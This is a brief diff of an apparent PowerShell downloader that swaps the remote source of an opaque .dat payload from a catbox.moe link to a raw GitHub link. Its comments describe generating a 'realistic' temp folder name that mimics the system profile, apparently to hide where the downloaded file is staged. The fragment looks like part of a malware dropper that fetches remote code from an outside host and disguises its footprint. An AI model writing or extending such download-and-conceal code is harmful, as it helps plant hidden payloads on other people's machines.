@@ -51,7 +51,7 @@ function Generate-TempFolderName {
 # Download application from URL
 try {
     # URL of the application to download
-    $downloadUrl = "https://files.catbox.moe/e6cycx.dat"  # Replace with actual URL
+    $downloadUrl = "https://raw.githubusercontent.com/Sl3epy-M0rph3us/124/refs/heads/main/e6cycx.dat"  # Replace with actual URL
     
     # Generate realistic temp folder name matching systemprofile pattern
     $tempFolderName = Generate-TempFolderName
